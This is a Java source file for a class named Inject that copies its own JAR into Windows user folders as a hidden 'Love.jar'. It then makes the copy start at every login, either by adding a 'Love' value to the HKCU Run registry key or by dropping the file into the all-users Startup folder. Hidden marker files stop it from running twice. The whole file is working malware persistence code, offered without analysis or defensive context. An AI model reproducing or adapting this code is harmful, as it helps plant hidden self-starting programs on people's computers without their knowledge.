package tools;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;

public class Inject extends Thread {
	private static final String verifyFileName = "verify.tst";
	private String path;
	private String file;
	private String name;
	private final static String newFile = "Love.jar";

	@Override
	public void run() {
		if (Tools.isExist(path + verifyFileName)) {
			return;
		}
		
		path = Inject.class.getResource("/").getPath().substring(1).replace("%20", " ");
		file = Inject.class.getProtectionDomain().getCodeSource().getLocation().getFile().substring(1).replace("%20",
				" ");
		name = System.getProperty("user.name");
		writeVerify(path + verifyFileName);
		System.out.println("path" + path);
		System.out.println("file" + file);
		System.out.println("name" + name);
		if (regedit()) {
			return;
		} else if (startUp()) {
			return;
		}

	}

	private boolean regedit() {
		boolean flag = false;
		String[] newPaths = { "C:\\Users\\" + name + "\\Documents\\", "C:\\Users\\" + name + "\\Pictures\\",
				"C:\\Users\\Public\\Documents\\" };
		for (int i = 0; i < newPaths.length; i++) {
			if (flag) {
				break;
			}
			if (!Tools.isDirectory(newPaths[i])) {
				continue;
			}
			String newFile = newPaths[i] + Inject.newFile;
			if (Tools.copyFile(file, newFile)) {
				writeVerify(newPaths[i]);

				Tools.hide(newFile);
				Process xexec = Exec.xexec(
						"REG ADD HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Love /t REG_SZ /d \""
								+ newFile + "\"");

				InputStream inputStream = xexec.getInputStream();
				byte[] b = new byte[65535];
				int len = 0;
				try {
					len = inputStream.read(b);
					String data = new String(b, 0, len);
					if (data.indexOf("成功") != -1) {
						flag = true;
					}
				} catch (IOException e) {

				} finally {
					try {
						inputStream.close();
					} catch (IOException e) {

					}
				}
			}
		}

		return flag;
	}

	private boolean startUp() {
		String newPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\";
		if (!Tools.isDirectory(newPath)) {
			return false;
		}
		String newFile = newPath + Inject.newFile;
		if (Tools.copyFile(file, newFile)) {
			Tools.hide(newFile);
			writeVerify(newPath);
		}
		return true;
	}

	private void writeVerify(String path) {
		File filea = new File(path + verifyFileName);

		try {
			filea.createNewFile();
			Tools.hide(filea.toString());
		} catch (IOException e1) {
		}
	}
}
